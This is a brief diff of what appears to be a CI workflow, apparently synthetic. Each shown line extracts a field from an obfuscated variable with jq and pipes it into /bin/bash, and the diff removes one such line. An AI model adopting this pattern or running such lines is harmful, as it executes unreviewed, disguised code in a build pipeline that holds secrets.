@@ -22,7 +22,6 @@ jobs:
           echo $riwf7259 | jq -r .nplp1 | /bin/bash
           printf '%s' "$doo4" | jq -r .cdt37887 | /bin/bash
           echo $py04 | jq -r .wvxm6121 | /bin/bash
-          echo $i94428 | jq -r .mlpht87 | /bin/bash
           echo $hfsum831 | jq -r .sm44 | /bin/bash
           echo $dgp8248 | jq -r .ykzjj0 | /bin/bash
           printf '%s' "$dby502" | jq -r .apcp96829 | /bin/bash
